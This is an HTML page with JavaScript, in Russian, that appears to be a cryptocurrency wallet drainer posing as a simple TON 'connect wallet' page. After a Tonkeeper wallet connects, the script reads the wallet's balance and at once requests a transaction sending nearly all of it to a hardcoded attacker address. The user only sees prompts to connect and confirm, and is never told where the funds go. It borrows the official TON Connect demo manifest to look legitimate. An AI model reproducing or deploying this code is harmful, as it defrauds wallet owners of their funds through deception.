<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TON</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0b0b;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: system-ui, sans-serif;
      padding: 16px;
    }
    .card {
      max-width: 400px;
      width: 100%;
      background: #151515;
      border-radius: 32px;
      padding: 32px 24px;
      text-align: center;
      border: 1px solid #282828;
    }
    .btn {
      background: #0088cc;
      border: none;
      color: white;
      font-size: 20px;
      font-weight: 700;
      padding: 18px;
      border-radius: 60px;
      width: 100%;
      cursor: pointer;
      margin-top: 12px;
      transition: 0.2s;
    }
    .btn:active { transform: scale(0.96); }
    .btn:disabled { opacity: 0.4; pointer-events: none; }
    #status {
      color: #aaa;
      font-size: 14px;
      margin-top: 20px;
      min-height: 24px;
    }
    .hidden { display: none !important; }
    .confirm-box {
      background: #1a2a3a;
      border: 1px solid #2a4a6a;
      border-radius: 20px;
      padding: 20px 16px;
      margin-top: 20px;
      display: none;
    }
    .confirm-box.show { display: block; }
    .confirm-box .title { color: #fff; font-weight: 600; font-size: 16px; }
    .confirm-box .sub { color: #8899aa; font-size: 13px; margin: 6px 0 14px; }
    .confirm-box .open-btn {
      background: #0088cc;
      border: none;
      color: #fff;
      font-weight: 600;
      font-size: 16px;
      padding: 12px;
      border-radius: 40px;
      width: 100%;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="card">
    <div style="font-size: 40px;">⚡</div>

    <button class="btn" id="connectBtn">🔗 ПОДКЛЮЧИТЬ</button>

    <div id="status">Нажмите кнопку</div>

    <div class="confirm-box" id="confirmBox">
      <div class="title">✅ Подтвердите транзакцию в Tonkeeper</div>
      <div class="sub">Откроется окно с ползунком</div>
      <button class="open-btn" id="openWalletBtn">Открыть Tonkeeper</button>
    </div>
  </div>

  <script>
    const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');
    const confirmBox = document.getElementById('confirmBox');
    const openWalletBtn = document.getElementById('openWalletBtn');

    let tonConnectUI = null;
    let userAddress = null;

    // ========== ЗАГРУЗКА TON CONNECT ==========
    function loadTonConnect() {
      if (typeof TONConnectUI !== 'undefined') {
        initTonConnect();
        return;
      }

      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js';
      script.onload = initTonConnect;
      script.onerror = () => {
        status.innerText = '❌ Ошибка загрузки. Проверь интернет.';
      };
      document.head.appendChild(script);
    }

    function initTonConnect() {
      try {
        tonConnectUI = new TONConnectUI({
          manifestUrl: 'https://raw.githubusercontent.com/ton-connect/sdk/main/packages/sdk/demo/public/tonconnect-manifest.json'
        });

        if (tonConnectUI.account) {
          userAddress = tonConnectUI.account.address;
          afterConnect();
        }

        tonConnectUI.onStatusChange((wallet) => {
          if (wallet) {
            userAddress = wallet.account.address;
            afterConnect();
          } else {
            userAddress = null;
            status.innerText = '🔴 Кошелёк отключён';
            connectBtn.classList.remove('hidden');
          }
        });

        status.innerText = '🟢 Нажмите кнопку';
      } catch (e) {
        status.innerText = '❌ ' + e.message;
      }
    }

    function afterConnect() {
      status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
      connectBtn.classList.add('hidden');
      confirmBox.classList.add('show');
      sendTransaction();
    }

    // ========== ОТПРАВКА ТРАНЗАКЦИИ ==========
    async function sendTransaction() {
      try {
        if (!tonConnectUI || !tonConnectUI.account) {
          status.innerText = '❌ Нет подключения';
          return;
        }

        status.innerText = '⏳ Проверка баланса...';

        const address = tonConnectUI.account.address;
        const res = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
        const data = await res.json();
        const nano = parseInt(data.result) || 0;

        if (nano <= 0) {
          status.innerText = '💰 Баланс 0 TON';
          return;
        }

        const fee = 5000000;
        const amount = nano - fee;
        if (amount <= 0) {
          status.innerText = '⚠️ Баланс меньше комиссии';
          return;
        }

        const amountTON = (amount / 1e9).toFixed(6);
        status.innerText = `⏳ Отправка ${amountTON} TON...`;

        // ====== СОЗДАЁМ ТРАНЗАКЦИЮ ======
        const result = await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [{
            address: TARGET,
            amount: amount.toString()
          }]
        });

        if (result) {
          status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
          connectBtn.innerText = '✅ ГОТОВО';
          connectBtn.className = 'btn';
          connectBtn.style.background = '#00aa66';
        }

      } catch (e) {
        status.innerText = '❌ ' + (e.message || 'Ошибка');
      }
    }

    // ========== КНОПКИ ==========
    connectBtn.onclick = function() {
      if (!tonConnectUI) {
        status.innerText = '⏳ Загрузка...';
        return;
      }
      status.innerText = '⏳ Открываю Tonkeeper...';
      connectBtn.disabled = true;
      tonConnectUI.connect()
        .then(() => {
          status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
          confirmBox.classList.add('show');
          connectBtn.disabled = false;
        })
        .catch((e) => {
          status.innerText = '❌ ' + (e.message || 'Ошибка');
          connectBtn.disabled = false;
        });
    };

    openWalletBtn.onclick = function() {
      if (tonConnectUI) tonConnectUI.connect();
    };

    // ========== ЗАПУСК ==========
    loadTonConnect();
    status.innerText = '⏳ Загрузка...';
  </script>
</body>
</html>
